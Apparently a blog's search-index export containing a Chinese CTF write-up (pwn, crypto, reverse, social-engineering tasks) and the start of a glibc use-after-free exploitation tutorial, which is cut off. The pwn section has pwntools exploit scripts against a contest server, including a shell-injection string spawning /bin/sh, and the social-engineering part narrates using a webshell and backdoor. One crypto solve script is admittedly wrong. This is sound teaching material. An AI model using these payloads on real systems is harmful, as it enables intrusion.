<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>JlenuCTF</title>
      <link href="2021/05/23/JlenuCTF/"/>
      <url>2021/05/23/JlenuCTF/</url>
      
        <content type="html"><![CDATA[<p>反正交完wp了，索性水个博客吧（</p><h2 id="HAPPYGAME"><a href="#HAPPYGAME" class="headerlink" title="HAPPYGAME"></a>HAPPYGAME</h2><h3 id="SIMPIOT"><a href="#SIMPIOT" class="headerlink" title="SIMPIOT"></a>SIMPIOT</h3><p>到手后直接strings一波，啊这</p><p><img src="https://i.loli.net/2021/05/22/KxLRHa4nw7hP8rY.png" alt=""></p><h3 id="社工一：帮我溯源"><a href="#社工一：帮我溯源" class="headerlink" title="社工一：帮我溯源"></a>社工一：帮我溯源</h3><p>我愿称为最强题目，雪宝yyds</p><p>👴🏻一开始不知道怎么回事，下载下来www.zip是这样的，莫不是👴🏻被搅屎了，浪费了👴🏻一个半小时看日志文件，然后还真给👴🏻查出个威胁情报ip来</p><p><img src="https://i.loli.net/2021/05/22/LHRF74sqPt3TV9D.png" alt=""></p><p><img src="https://i.loli.net/2021/05/22/KNnSZ8rAUVWqfPc.png" alt=""></p><p>后来👴🏻测了一堆无用功，找了一些日志审计脚本和手写正则的脚本，发现啥都查不到，👴🏻傻了，👴🏻寻思happygame给👴🏻整不happy了，👴🏻很气愤，👴🏻去睡觉了</p><p>👴🏻第二天越想越气，👴🏻决定再来做一做，👴🏻重新下载www.zip，👴🏻傻了，竟然是网站源码，****</p><p>好了，开始审计，rips给👴🏻扫</p><p><img src="https://i.loli.net/2021/05/23/qvtuL1K3yZToQCB.png" alt=""></p><p>扫出来木马了，👴🏻直接连shell，然后hacked by HSYM</p><h3 id="社工二：深入调查"><a href="#社工二：深入调查" class="headerlink" title="社工二：深入调查"></a>社工二：深入调查</h3><p><img src="https://i.loli.net/2021/05/23/2dEKNoIMWHhtbGf.png" style="zoom:50%;" /></p><p>审日志，ip到手</p><h3 id="社工三：信息收集"><a href="#社工三：信息收集" class="headerlink" title="社工三：信息收集"></a>社工三：信息收集</h3><p>访问带黑客的网站，发现扣扣号，找到他的生日了，有hint，博客后台是id+生日</p><p><img src="https://i.loli.net/2021/05/23/JYo1FjGAEbpklhi.png" alt=""></p><p>然后就可以进带黑客的后台了</p><h3 id="社工四：反击黑客"><a href="#社工四：反击黑客" class="headerlink" title="社工四：反击黑客"></a>社工四：反击黑客</h3><p>这个👴🏻没有做出来，但是👴🏻不知道哪里不对，先记录一下8</p><p>进了后台，用msf连接shell不就行了</p><p>然后找到了这个udf.php，有不会修电脑师傅留下的后门，这不直接拿来用一波</p><p>然后尝试查看backup发现disable_function给ban了好多system之类的东西，算了，再看看别的目录</p><p>然后发现了这个</p><p><img src="https://i.loli.net/2021/05/23/klZN8cqTEMKp2Qg.png" style="zoom:50%;" /></p><p>芜湖，然后邮箱密码就拿到了，用带黑客的ProtonMail邮箱登进去，发现坚果云2333</p><p><img src="https://i.loli.net/2021/05/23/pxSX9ogACfr5BY1.png" style="zoom:50%;" /></p><p>发现带黑客的身份证，那按理来说黑客就住在下北泽？但是flag不对</p><p><img src="https://i.loli.net/2021/05/23/QXrWPYkZ62uTCNs.png" style="zoom:50%;" /></p><p>所以👴🏻百度百科查到了下北泽的各种叫法和下北泽在日本的具体位置，都不对，算了，不做了，补作业去了（x</p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="warm-up"><a href="#warm-up" class="headerlink" title="warm-up"></a>warm-up</h3><p>直接在console里调用js代码即可弹出flag</p><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="WHATS-HAPPEN"><a href="#WHATS-HAPPEN" class="headerlink" title="WHATS HAPPEN?"></a>WHATS HAPPEN?</h3><p>简单的盲文，找个在线解密的一把梭就好了</p><h3 id="Baby-RSA"><a href="#Baby-RSA" class="headerlink" title="Baby_RSA"></a>Baby_RSA</h3><p>虽然没有做出来，但是感觉思路没问题，先填个坑，不知道中间哪一步错了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert,gcd</span><br><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long,long_to_bytes</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_random_prime</span>(<span class="params">bits</span>):</span></span><br><span class="line">  <span class="keyword">return</span> sympy.randprime(<span class="number">2</span>**(bits-<span class="number">1</span>), <span class="number">2</span>**bits)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_key</span>(<span class="params">bits</span>):</span></span><br><span class="line">    p = get_random_prime(bits)</span><br><span class="line">    q = get_random_prime(bits)</span><br><span class="line">    r = get_random_prime(bits)</span><br><span class="line">    e = get_random_prime(<span class="number">48</span>)</span><br><span class="line">    <span class="keyword">assert</span> gcd(e,phi)==<span class="number">1</span></span><br><span class="line">    d=invert(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>)*(r-<span class="number">1</span>)//gcd(p-<span class="number">1</span>,(gcd(q-<span class="number">1</span>,r-<span class="number">1</span>))))</span><br><span class="line">    <span class="keyword">return</span> (e,d,p*q*r)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">msg,e,n</span>):</span></span><br><span class="line">    cipher=<span class="built_in">pow</span>(bytes_to_long(flag),e,n)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">r&quot;nflag.enc&quot;</span>,<span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(<span class="built_in">hex</span>(cipher)[<span class="number">2</span>:])</span><br><span class="line">        f.close()</span><br><span class="line">        </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">export_pubkey</span>(<span class="params">n,e</span>):</span></span><br><span class="line">    pubkey = RSA.construct((n,e))</span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">r&#x27;npubkey.pem&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">    f.write(pubkey.export_key())</span><br><span class="line">    f.close()</span><br><span class="line"></span><br><span class="line">e,d,n=gen_key(<span class="number">256</span>)</span><br><span class="line">export_pubkey(n,e)</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;d:&quot;</span>,d)</span><br><span class="line"><span class="comment">#d:6848345389131232097250291554774004483864247462767351912899751705063009304102012225840379809975695209148626539132005837425458215616241927473070938221119168859672496841054510245128799501775634965114887272776082740599056090759932017</span></span><br><span class="line">encrypt(flag,<span class="number">7</span>,n)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>先给了d，解出来pq，然后加密的时候又把e换成了7</p><p>但是解的时候解不出来，不知道哪里错了，orz</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">p = <span class="number">0xcd2e55e25e84bd7e050e4e28e0725f2b02442e2d55fcc8053f53811610b7a8e1d3aa2d3f3e3923d3f5ad20e00fbe532b255768d77d9e07fc23bbc6c039d741d9</span></span><br><span class="line">q = <span class="number">0xa170bce7723a072e1cfa7b466916939df85d1b97d29c73d5f3cdd8cf49f8194f</span></span><br><span class="line">e = <span class="number">7</span></span><br><span class="line">c = <span class="number">0x3773fd7f928a0231c0a26e48678984fc36db84f4d63de0cdb36a3101e6e48e140a21b6a6fae834dfaa2670d36444a5f002d28a5d4a9efb6822af43d4d98f4aa9a18139b76527049d2c4419d7ad4ddd9ef65ec7176842aa9ced2f8b14af7bf731</span></span><br><span class="line">s = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = long(gmpy2.invert(e, s))</span><br><span class="line">n = p * q</span><br><span class="line"><span class="built_in">print</span> (<span class="built_in">pow</span>(c, e, d))</span><br></pre></td></tr></table></figure><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="easy-sender"><a href="#easy-sender" class="headerlink" title="easy_sender"></a>easy_sender</h3><p>签到题，ret2text</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">binary = <span class="string">&#x27;./easysender&#x27;</span></span><br><span class="line">port = <span class="number">10000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">    p = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;118.195.156.186&#x27;</span>,port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x14</span> + p64(<span class="number">0x080491B6</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="strread"><a href="#strread" class="headerlink" title="strread"></a>strread</h3><p>有web内味了，尝试用单引号和分号闭合，payload是试出来的</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">binary = <span class="string">&#x27;./white&#x27;</span></span><br><span class="line">port = <span class="number">10002</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">    p = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;118.195.156.186&#x27;</span>,port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Path to follow:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;]&#x27;&amp;&amp;/bin/sh;&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="strlenvsread"><a href="#strlenvsread" class="headerlink" title="strlenvsread"></a>strlenvsread</h3><p><img src="https://i.loli.net/2021/05/22/ZUKae2Nf7WwczAu.png" alt=""></p><p>漏洞点在于strlen读取的长度可以被00截断，但是read的返回值不可以，溢出就完事了嗷</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">binary = <span class="string">&#x27;./strlenvsread&#x27;</span></span><br><span class="line">port = <span class="number">10001</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">    p = process(binary)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;118.195.156.186&#x27;</span>,port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Neo, enter your matrix: &#x27;</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;a\x00&#x27;</span> + <span class="string">b&#x27;a&#x27;</span> * <span class="number">100</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Make your choice: &#x27;</span>)</span><br><span class="line">p.send(p64(<span class="number">0</span>) * <span class="number">3</span> + p64(<span class="number">0x21</span>) + p64(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h2><h3 id="MEGA-RACE"><a href="#MEGA-RACE" class="headerlink" title="MEGA-RACE"></a>MEGA-RACE</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">size_t</span> __fastcall <span class="title">scram</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *flag)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">size_t</span> i; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">size_t</span> v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="built_in">strlen</span>(flag);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0LL</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = i;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= v3 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    flag[i] ^= <span class="number">0x77</span>u;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简单的异或，写个脚本简单解密即可</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> pass[] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">0x11</span>, <span class="number">0x1B</span>, <span class="number">0x16</span>, <span class="number">0x10</span>, <span class="number">0x0C</span>, <span class="number">0x14</span>, <span class="number">0x47</span>, <span class="number">0x19</span>, <span class="number">0x10</span>, <span class="number">0x05</span>, </span><br><span class="line">  <span class="number">0x43</span>, <span class="number">0x03</span>, <span class="number">0x02</span>, <span class="number">0x1B</span>, <span class="number">0x43</span>, <span class="number">0x03</span>, <span class="number">0x46</span>, <span class="number">0x47</span>, <span class="number">0x19</span>, <span class="number">0x0D</span>, </span><br><span class="line">  <span class="number">0x28</span>, <span class="number">0x0E</span>, <span class="number">0x47</span>, <span class="number">0x02</span>, <span class="number">0x28</span>, <span class="number">0x16</span>, <span class="number">0x05</span>, <span class="number">0x44</span>, <span class="number">0x28</span>, <span class="number">0x03</span>, </span><br><span class="line">  <span class="number">0x1F</span>, <span class="number">0x44</span>, <span class="number">0x28</span>, <span class="number">0x30</span>, <span class="number">0x22</span>, <span class="number">0x2E</span>, <span class="number">0x56</span>, <span class="number">0x0A</span>, <span class="number">0x00</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="built_in">strlen</span>(pass);i++)</span><br><span class="line">    &#123;</span><br><span class="line">        pass[i] = pass[i] ^ <span class="number">0x77</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(pass);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="easy-py"><a href="#easy-py" class="headerlink" title="easy_py"></a>easy_py</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># while None:</span></span><br><span class="line"><span class="comment">#     Happy = [</span></span><br><span class="line"><span class="comment">#         39,</span></span><br><span class="line"><span class="comment">#         109,</span></span><br><span class="line"><span class="comment">#         8,</span></span><br><span class="line"><span class="comment">#         109,</span></span><br><span class="line"><span class="comment">#         51,</span></span><br><span class="line"><span class="comment">#         70,</span></span><br><span class="line"><span class="comment">#         21,</span></span><br><span class="line"><span class="comment">#         65,</span></span><br><span class="line"><span class="comment">#         11,</span></span><br><span class="line"><span class="comment">#         112,</span></span><br><span class="line"><span class="comment">#         22,</span></span><br><span class="line"><span class="comment">#         111,</span></span><br><span class="line"><span class="comment">#         33,</span></span><br><span class="line"><span class="comment">#         82,</span></span><br><span class="line"><span class="comment">#         93,</span></span><br><span class="line"><span class="comment">#         124,</span></span><br><span class="line"><span class="comment">#         23,</span></span><br><span class="line"><span class="comment">#         72,</span></span><br><span class="line"><span class="comment">#         77,</span></span><br><span class="line"><span class="comment">#         125,</span></span><br><span class="line"><span class="comment">#         115,</span></span><br><span class="line"><span class="comment">#         74,</span></span><br><span class="line"><span class="comment">#         27,</span></span><br><span class="line"><span class="comment">#         98,</span></span><br><span class="line"><span class="comment">#         23,</span></span><br><span class="line"><span class="comment">#         87,</span></span><br><span class="line"><span class="comment">#         0,</span></span><br><span class="line"><span class="comment">#         95,</span></span><br><span class="line"><span class="comment">#         18,</span></span><br><span class="line"><span class="comment">#         115,</span></span><br><span class="line"><span class="comment">#         117,</span></span><br><span class="line"><span class="comment">#         42,</span></span><br><span class="line"><span class="comment">#         122,</span></span><br><span class="line"><span class="comment">#         18,</span></span><br><span class="line"><span class="comment">#         18,</span></span><br><span class="line"><span class="comment">#         124,</span></span><br><span class="line"><span class="comment">#         103,</span></span><br><span class="line"><span class="comment">#         88]</span></span><br><span class="line"><span class="comment">#     num = 37</span></span><br><span class="line"><span class="comment">#     f = input(&#x27;Please input your flag:&#x27;)</span></span><br><span class="line"><span class="comment">#     if len(f) != 38:</span></span><br><span class="line"><span class="comment">#         print(&#x27;Your input is illegal&#x27;)</span></span><br><span class="line"><span class="comment">#         continue</span></span><br><span class="line"><span class="comment">#     flag = list(f)</span></span><br><span class="line"><span class="comment">#     j = 0</span></span><br><span class="line"><span class="comment">#     for i in flag:</span></span><br><span class="line"><span class="comment">#         flag[j] = ord(i)</span></span><br><span class="line"><span class="comment">#         j += 1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#     t1 = threading.Thread(encode_1, (1,), **(&#x27;target&#x27;, &#x27;args&#x27;))</span></span><br><span class="line"><span class="comment">#     t2 = threading.Thread(encode_2, (2,), **(&#x27;target&#x27;, &#x27;args&#x27;))</span></span><br><span class="line"><span class="comment">#     t1.start()</span></span><br><span class="line"><span class="comment">#     time.sleep(0.5)</span></span><br><span class="line"><span class="comment">#     t2.start()</span></span><br><span class="line"><span class="comment">#     t1.join()</span></span><br><span class="line"><span class="comment">#     t2.join()</span></span><br><span class="line"><span class="comment">#     if flag == Happy:</span></span><br><span class="line"><span class="comment">#         print(&#x27;Good job!&#x27;)</span></span><br><span class="line"><span class="comment">#         continue</span></span><br><span class="line"><span class="comment">#     print(&#x27;No no no!&#x27;)</span></span><br></pre></td></tr></table></figure><p>是个多线程，encode函数是简单的异或</p><p>简单写个解密脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span>():</span></span><br><span class="line">    flag = [</span><br><span class="line">        <span class="number">39</span>,</span><br><span class="line">        <span class="number">109</span>,</span><br><span class="line">        <span class="number">8</span>,</span><br><span class="line">        <span class="number">109</span>,</span><br><span class="line">        <span class="number">51</span>,</span><br><span class="line">        <span class="number">70</span>,</span><br><span class="line">        <span class="number">21</span>,</span><br><span class="line">        <span class="number">65</span>,</span><br><span class="line">        <span class="number">11</span>,</span><br><span class="line">        <span class="number">112</span>,</span><br><span class="line">        <span class="number">22</span>,</span><br><span class="line">        <span class="number">111</span>,</span><br><span class="line">        <span class="number">33</span>,</span><br><span class="line">        <span class="number">82</span>,</span><br><span class="line">        <span class="number">93</span>,</span><br><span class="line">        <span class="number">124</span>,</span><br><span class="line">        <span class="number">23</span>,</span><br><span class="line">        <span class="number">72</span>,</span><br><span class="line">        <span class="number">77</span>,</span><br><span class="line">        <span class="number">125</span>,</span><br><span class="line">        <span class="number">115</span>,</span><br><span class="line">        <span class="number">74</span>,</span><br><span class="line">        <span class="number">27</span>,</span><br><span class="line">        <span class="number">98</span>,</span><br><span class="line">        <span class="number">23</span>,</span><br><span class="line">        <span class="number">87</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">95</span>,</span><br><span class="line">        <span class="number">18</span>,</span><br><span class="line">        <span class="number">115</span>,</span><br><span class="line">        <span class="number">117</span>,</span><br><span class="line">        <span class="number">42</span>,</span><br><span class="line">        <span class="number">122</span>,</span><br><span class="line">        <span class="number">18</span>,</span><br><span class="line">        <span class="number">18</span>,</span><br><span class="line">        <span class="number">124</span>,</span><br><span class="line">        <span class="number">103</span>,</span><br><span class="line">        <span class="number">88</span>]</span><br><span class="line"></span><br><span class="line">    templist = [<span class="number">0</span>] * <span class="number">38</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">37</span>, <span class="number">0</span>, -<span class="number">2</span>):</span><br><span class="line">        templist[i] = flag[i] ^ i</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">36</span>, <span class="number">0</span>, -<span class="number">2</span>):</span><br><span class="line">        templist[i] = flag[i] ^ flag[i + <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># flag = templist</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">        templist[i] = <span class="built_in">chr</span>(templist[i])</span><br><span class="line"></span><br><span class="line">    print(<span class="string">&quot;&quot;</span>.join(templist))</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>不同版本Glibc下的UAF漏洞利用</title>
      <link href="2021/05/18/GlibcUAF/"/>
      <url>2021/05/18/GlibcUAF/</url>
      
        <content type="html"><![CDATA[<p>​    由于现在CTF比赛中，pwn方向涉及的libc版本众多，不同版本之间的堆块在组织方式上都有差别，刚开始学习的堆的朋友们大多数都是从最经典的UAF来入手的，本文来通过同一个UAF的demo程序，来来大家交流学习下下不同版本libc下的利用手法。</p><p>​    程序源码如下，给出了较为宽松的堆块编辑方式和组织方式，方便讨论利用手法。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> sizearray[<span class="number">20</span>];</span><br><span class="line"><span class="keyword">char</span> *heaparray[<span class="number">20</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">myinit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">menu</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;1.add&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2.edit&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;3.delete&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;4.show&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;5.exit&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;choice&gt; &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">int</span> size;</span><br><span class="line">    <span class="keyword">char</span> temp[<span class="number">8</span>];</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;index?&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, temp, <span class="number">8</span>);</span><br><span class="line">    i = atoi(temp);</span><br><span class="line">    <span class="keyword">if</span> (i &gt; <span class="number">20</span>)</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;size?&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, temp, <span class="number">8</span>);</span><br><span class="line">    size = atoi(temp);</span><br><span class="line">    <span class="keyword">if</span> (size &gt; <span class="number">0</span> &amp;&amp; size &lt; <span class="number">0x500</span>)</span><br><span class="line">        sizearray[i] = size;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">char</span> *p = <span class="built_in">malloc</span>(size);</span><br><span class="line">    heaparray[i] = p;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;content:&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, p, size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">edit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">char</span> temp[<span class="number">8</span>];</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;index?&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, temp, <span class="number">8</span>);</span><br><span class="line">    i = atoi(temp);</span><br><span class="line">    <span class="keyword">if</span> (heaparray[i])</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;content:&quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>, heaparray[i], sizearray[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">char</span> temp[<span class="number">8</span>];</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;index?&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, temp, <span class="number">8</span>);</span><br><span class="line">    i = atoi(temp);</span><br><span class="line">    <span class="keyword">if</span> (heaparray[i])</span><br><span class="line">        <span class="built_in">puts</span>(heaparray[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete</span> <span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">char</span> temp[<span class="number">8</span>];</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;index?&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, temp, <span class="number">8</span>);</span><br><span class="line">    i = atoi(temp);</span><br><span class="line">    <span class="keyword">if</span> (heaparray[i])</span><br><span class="line">        <span class="built_in">free</span>(heaparray[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> choice;</span><br><span class="line">    myinit();</span><br><span class="line">    menu();</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;choice);</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (choice == <span class="number">1</span>)</span><br><span class="line">            add();</span><br><span class="line">        <span class="keyword">if</span> (choice == <span class="number">2</span>)</span><br><span class="line">            edit();</span><br><span class="line">        <span class="keyword">if</span> (choice == <span class="number">3</span>)</span><br><span class="line">            <span class="keyword">delete</span> ();</span><br><span class="line">        <span class="keyword">if</span> (choice == <span class="number">4</span>)</span><br><span class="line">            show();</span><br><span class="line">        <span class="keyword">if</span> (choice == <span class="number">5</span>)</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        menu();</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;choice);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-23"><a href="#2-23" class="headerlink" title="2.23"></a>2.23</h2><h3 id="利用手法"><a href="#利用手法" class="headerlink" title="利用手法"></a>利用手法</h3><p>​    2.23的UAF是比较经典的利用手法了，此时libc还没有引入tcache结构，仅仅通过fastbin来管理较小的chunk，在libc2.23下可以利用fastbin attack来攻击__malloc_hook来getshell。</p><p>​    具体步骤，是先通过申请一个属于unsorted 